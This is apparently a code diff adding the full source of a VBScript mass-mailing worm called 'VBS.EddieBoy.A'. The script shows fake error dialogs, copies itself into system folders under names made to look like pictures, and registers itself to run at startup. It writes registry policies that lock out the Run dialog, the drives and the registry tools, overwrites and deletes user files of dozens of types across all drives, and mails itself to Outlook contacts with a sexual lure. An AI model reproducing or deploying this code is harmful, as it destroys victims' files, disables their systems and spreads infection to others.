@@ -1,0 +1,155 @@
+' VBS.EddieBoy.A
+' In Honor of My Cuz, Eddie Boy....
+
+msgbox "Windows Jpg Decoder is unable to view this picture." & vbcrlf & "", VBCritical,"Decoder Error"
+
+spawn()
+
+sub spawn()
+' Create worm backup
+Set s = CreateObject("Scripting.FileSystemObject")
+Set f = s.GetFile(wscript.scriptfullname)
+f.Copy ("c:\SXY-PIC.jpg.vbs")
+f.Copy ("c:\WINDOWS\System32\Sys32DLL.vbs")
+f.Copy ("c:\WINDOWS\YOUR-SXY-PIC.jpg.vbs")
+end sub
+
+set eddie3rd = wscript.CreateObject("WScript.Shell")
+Set fso = createobject("scripting.filesystemobject")
+' Registry startup
+eddie3rd.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Sys32DLL" , "C:\WINDOWS\System32\Sys32DLL.vbs"
+
+msgbox "MSKernal Invlid Error Number 4X0009976436" & vbcrlf & "", VBCritical,"System Error"
+
+' Edit registry so certain applications wont run 
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoFileSharingControl", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoVirtMemPage", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoFileSysPage", 1, "REG_DWORD"
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
+
+eddie()
+
+Sub eddie()
+
+On Error Resume Next
+Dim d, dc, s, fso, eddie
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set dc = fso.Drives
+For Each d In dc
+If d.DriveType = 2 Or d.DriveType = 3 Then
+eddieboy (d.Path & "\")
+End If
+Next
+eddie = s
+End Sub
+
+Sub ed(folderspec)
+On Error Resume Next
+Dim f, f1, fc, ext, s, fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set f = fso.GetFolder(folderspec)
+Set fc = f.Files
+For Each f1 In fc
+ext = fso.GetExtensionName(f1.Path)
+ext = LCase(ext)
+s = LCase(f1.Name)
+' This is my fav part....
+' he he he
+' :-)
+If (ext = "txt") Or (ext = "mp3") Or (ext = "doc") Or (ext = "bat") Or (ext = "html") Or (ext = "lnk") Or (ext = "mpg") Or (ext = "pdf") Or (ext = "exe") Or (ext = "jpg") Or (ext = "jpeg") Or (ext = "gif") Or (ext = "zip") Or (ext = "rtf") Or (ext = "wmv") Or (ext = "cmd") Or (ext = "vbe") Or (ext = "js") Or (ext = "tmp") Or (ext = "xls") Or (ext = "htm") Or (ext = "shtml") Or (ext = "rar") Or (ext = "scr") Or (ext = "tar") Or (ext = "bmp") Or (ext = "dll") Or (ext = "com") Or (ext = "mp2") Or (ext = "css") Or (ext = "wsh") Or (ext = "msg") Or (ext = "psd") Or (ext = "jse") Or (ext = "reg") Or (ext = "cpp") Or (ext = "cpl") Or (ext = "sys") Or (ext = "old") Or (ext = "c") Or (ext = "asm") Or (ext = "mpeg") Or (ext = "pl") Or (ext = "swp") Or (ext = "tga") Or (ext = "wav") Or (ext = "wpt") Or (ext = "avi") Or (ext = "cat") Or (ext = "tiff") Or (ext = "tif") Or (ext = "movie") Or (ext = "mov") Or (ext = "moov") Or (ext = "jfif") Or (ext = "$$$") Or (ext = "img") Or (ext = "obj") Then
+Set f = fso.GetFile(wscript.scriptfullname)
+f.Copy (f1.Path & ".vbs")
+fso.deletefile(f1.path)
+End If
+If (s = "SXY-PIC") Or (s = "Win32DLL") or (s = "Sys32DLL") Then
+Set f = fso.getfile(wscript.scriptfullname)
+f.Copy (f1.Path)
+fso.deletefile(f1.path)
+End If
+' ========================================================================
+' Greetz to Anti-Virus Companies:
+' I will survive,
+' In this momment in time,
+' Your computer will crash,
+' So u will be mine,
+' I never crash,
+' I never fail,
+' So, in this momment in time,
+' I will survive...
+' -=[{(0)}]~VBS.EddieBoy.A~[{(0)}]=-
+' December 19, 2004
+' ========================================================================
+Next
+End Sub
+Sub eddieboy(folderspec)
+On Error Resume Next
+Dim f, f1, sf, fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set f = fso.GetFolder(folderspec)
+Set sf = f.SubFolders
+For Each f1 In sf
+ed (f1.Path)
+eddieboy (f1.Path)
+Next
+End Sub
+
+Randomize
+r = int(rnd * 10)
+If r = 7 then
+msgbox "I~WILL~SURVIVE...." & vbcrlf & "", VBCritical,"..."
+end if
+
+'spread throuh outlook express
+mail()
+
+sub mail()
+
+Set a = CreateObject("Outlook.Application")
+Set b = a.GetNameSpace("MAPI")
+If a = "Outlook" Then
+b.Logon "profile", "password"
+For y = 1 To b.AddressLists.Count
+Set d = b.AddressLists(y)
+x = 1
+Set c = a.CreateItem(0)
+For oo = 1 To d.AddressEntries.Count
+e = d.AddressEntries(x)
+c.Recipients.Add e
+x = x + 1
+If x > 5 Then oo = d.AddressEntries.Count
+Next
+c.Subject = "RE: UR SEXY"
+c.Body = "...Your Pic, damn ur fuckn hot..."
+c.attachments.Add wscript.scriptfullname, 1, 1
+c.attachments.Add "c:\SXY-PIC.jpg.vbs", 1, 2, ""
+c.attachments.Add "c:\WINDOWS\YOUR-SXY-PIC.jpg.vbs", 1, 3, ""
+c.Send
+e = ""
+Next
+b.Logoff
+End If
+end sub
+
+'Antideletion function by [K]Alamar
+' Thanks [K] For Anti-Deleteion Tutorial :-)
+Function antideletion()
+Set fso = CreateObject("scripting.filesystemobject")
+Set fuck = fso.opentextfile(wscript.scriptfullname, 1)
+vir = fuck.readall
+fuck.Close
+Do
+If Not (fso.fileexists(wscript.scriptfullname)) Then
+Set fuck = fso.createtextfile(wscript.scriptfullname, True)
+fuck.write vir
+fuck.Close
+End If
+Loop
+End Function
